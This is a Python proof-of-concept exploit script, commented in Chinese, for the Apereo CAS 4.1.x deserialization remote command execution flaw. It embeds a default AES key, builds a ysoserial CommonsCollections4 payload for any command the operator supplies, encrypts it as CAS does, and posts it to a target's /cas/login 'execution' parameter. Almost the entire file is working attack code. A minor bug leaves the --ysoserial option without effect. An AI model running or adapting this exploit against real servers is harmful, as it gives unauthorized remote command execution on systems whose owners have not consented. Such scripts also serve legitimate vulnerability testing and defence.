#!/usr/bin/env python3
"""
Apereo CAS 4.1.x 反序列化远程命令执行 POC
漏洞原理：Webflow 使用硬编码密钥 "changeit" 的 AES 加密存储序列化对象，
攻击者可构造恶意序列化 payload，加密后通过 /cas/login 的 execution 参数发送。
依赖：ysoserial.jar (生成 CommonsCollections4 载荷)
      pycryptodome (Python 加密库)
"""

import os
import sys
import gzip
import base64
import random
import argparse
import subprocess
import requests
from urllib.parse import urljoin

# 尝试导入 AES 库，若未安装则提示
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
except ImportError:
    print("[!] 需要安装 pycryptodome：pip install pycryptodome")
    sys.exit(1)

# ===== 默认密钥 =====
# 该密钥来自 Apereo CAS 4.1.5 默认的 keystore.jceks（别名 aes128，密码 changeit）
# 如果目标已替换 keystore，请自行提取并替换此密钥
DEFAULT_AES_KEY = bytes([
    0xd8, 0x17, 0xc1, 0x0f, 0x23, 0x7c, 0xc7, 0xf6,
    0x28, 0xb3, 0x0d, 0x7f, 0x86, 0xca, 0x49, 0x92
])

# ysoserial 默认文件名，可修改
YSOSERIAL_JAR = "ysoserial.jar"

def load_keystore_key(keystore_path, store_pass="changeit", alias="aes128", key_pass="changeit"):
    """
    尝试使用 jks 库从 JCEKS 密钥库中提取 AES 密钥。
    需要 pip install pyjks
    """
    try:
        import jks
    except ImportError:
        print("[!] 未安装 pyjks，无法读取密钥库。使用默认硬编码密钥。")
        return None

    try:
        ks = jks.KeyStore.load(keystore_path, store_pass)
        if alias in ks.secret_keys:
            sk = ks.secret_keys[alias]
            if sk.algo == "AES":
                print(f"[+] 成功从 {keystore_path} 加载 AES 密钥（别名 {alias}）")
                # pyjks 对于 JCEKS，密钥在 sk.key 中
                return sk.key
        print(f"[!] 未在密钥库中找到别名 {alias}")
    except Exception as e:
        print(f"[!] 读取密钥库失败: {e}")
    return None


def generate_payload(command, gadget="CommonsCollections4", ysoserial_path=YSOSERIAL_JAR):
    """调用 ysoserial 生成序列化 payload"""
    if not os.path.exists(ysoserial_path):
        print(f"[!] 未找到 ysoserial.jar，请将其放在当前目录或指定路径。")
        print(f"    下载地址: https://github.com/frohoff/ysoserial/releases")
        sys.exit(1)

    print(f"[*] 正在生成 {gadget} payload: {command}")
    cmd = ["java", "-jar", ysoserial_path, gadget, command]
    try:
        proc = subprocess.run(cmd, capture_output=True, check=True)
        return proc.stdout
    except subprocess.CalledProcessError as e:
        print(f"[!] ysoserial 执行失败: {e.stderr.decode()}")
        sys.exit(1)


def encrypt_payload(plain_bytes, aes_key):
    """
    模拟 Apereo CAS EncryptedTranscoder 加密过程：
    1. GZIP 压缩
    2. AES/CBC/PKCS7 加密
    3. 返回 Base64( IV + 密文 )
    """
    # 1. GZIP 压缩
    compressed = gzip.compress(plain_bytes)
    print(f"[*] 压缩后大小: {len(compressed)} 字节")

    # 2. 生成随机 16 字节 IV
    iv = random.randbytes(16)  # Python 3.9+
    # 若 Python < 3.9，可使用: iv = os.urandom(16)

    # 3. AES-CBC 加密，PKCS7 填充
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(compressed, AES.block_size, style='pkcs7'))

    # 4. 拼接 IV + 密文，然后 Base64 编码
    encrypted_with_iv = iv + encrypted
    return base64.b64encode(encrypted_with_iv).decode()


def exploit(target_url, command, gadget="CommonsCollections4", keystore=None, proxy=None):
    """
    发送恶意请求触发漏洞
    """
    # 准备 AES 密钥
    aes_key = DEFAULT_AES_KEY
    if keystore:
        key = load_keystore_key(keystore)
        if key:
            aes_key = key
    print(f"[*] 使用 AES 密钥: {aes_key.hex()}")

    # 生成 ysoserial payload
    raw_payload = generate_payload(command, gadget)
    print(f"[*] 原始 payload 大小: {len(raw_payload)} 字节")

    # 加密 payload
    encrypted_execution = encrypt_payload(raw_payload, aes_key)
    print(f"[*] 加密后 execution 长度: {len(encrypted_execution)}")

    # 构造请求
    login_url = urljoin(target_url, "/cas/login")
    print(f"[*] 目标 URL: {login_url}")

    # 这里的 lt 参数可以任意填写，或从首页提取，通常不需要真实值
    data = {
        "username": "test",
        "password": "test",
        "lt": "LT-1-test",
        "execution": encrypted_execution,
        "_eventId": "submit",
        "submit": "LOGIN"
    }
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    proxies = {"http": proxy, "https": proxy} if proxy else None

    try:
        print("[*] 正在发送恶意请求...")
        resp = requests.post(login_url, data=data, headers=headers,
                             proxies=proxies, timeout=15, allow_redirects=False)
        print(f"[*] 响应状态码: {resp.status_code}")
        if resp.status_code in [200, 302]:
            print("[+] 请求已发送，若目标存在漏洞，命令已执行（无回显，请用 DNSLog 等方式验证）")
        else:
            print(f"[-] 响应异常，可能漏洞不存在或目标无法访问")
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Apereo CAS 4.1.x 反序列化命令执行 POC"
    )
    parser.add_argument("-t", "--target", required=True,
                        help="目标地址，如 http://192.168.1.10:8080")
    parser.add_argument("-c", "--command", required=True,
                        help="要执行的系统命令，如 'touch /tmp/success'")
    parser.add_argument("-g", "--gadget", default="CommonsCollections4",
                        help="ysoserial 利用链，默认 CommonsCollections4")
    parser.add_argument("-y", "--ysoserial", default=YSOSERIAL_JAR,
                        help="ysoserial.jar 路径")
    parser.add_argument("-k", "--keystore", default=None,
                        help="目标 keystore.jceks 文件路径（可选，未提供则使用默认密钥）")
    parser.add_argument("-p", "--proxy", default=None,
                        help="HTTP 代理，如 http://127.0.0.1:8080")
    args = parser.parse_args()

    # 更新全局 ysoserial 路径
    YSOSERIAL_JAR = args.ysoserial

    exploit(args.target, args.command, args.gadget, args.keystore, args.proxy)